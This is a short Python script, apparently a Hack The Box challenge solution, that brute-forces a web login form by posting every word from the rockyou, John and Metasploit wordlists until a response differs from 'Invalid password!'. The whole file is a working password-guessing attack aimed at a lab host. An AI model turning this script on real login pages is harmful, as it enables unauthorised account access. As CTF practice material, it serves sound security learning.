# use codecs open method because metasploitPW has non-utf8 encoded strings
import codecs
import requests
from bs4 import BeautifulSoup

# create vars for filepaths
john_path = './johnPW.lst'
meta_path = './metasploitPW.lst'
rockyou_path = './rockyou.txt'

# open files, read only
john_list_opened = open(john_path, 'r')
# meta_list_opened = open(meta_path, 'r')
meta_list_opened = codecs.open(meta_path, 'r', encoding='utf-8', errors='ignore')
rockyou_opened = codecs.open(rockyou_path, 'r', encoding='utf-8', errors='ignore')

# create arrays containing words from files
john_words = john_list_opened.read().split('\n')
meta_words = meta_list_opened.read().split('\n')
combined = meta_words + john_words
rockyou_words = rockyou_opened.read().split('\n')

# loop through lists and make post requests
test = ['abcdef', 'password']
for word in rockyou_words:
    post_req = requests.post('http://docker.hackthebox.eu:39077', data={'password':word})
    # print(post_req.content, '\n')
    soup = BeautifulSoup(post_req.content, 'html.parser')
    lines = soup.get_text().splitlines()
    if lines[0] != 'Invalid password!':
        # print response if password is valid
        print(soup.prettify, '\n', 'Password: %s' % word)
        break
    else:
        # else print attempted word and response
        print('%s: %s' % (word, lines[0]))

    # print(soup.prettify, '\n')

# r = requests.get('http://docker.hackthebox.eu:39077').content
# soup = BeautifulSoup(r, 'html.parser')
# print(soup.prettify)
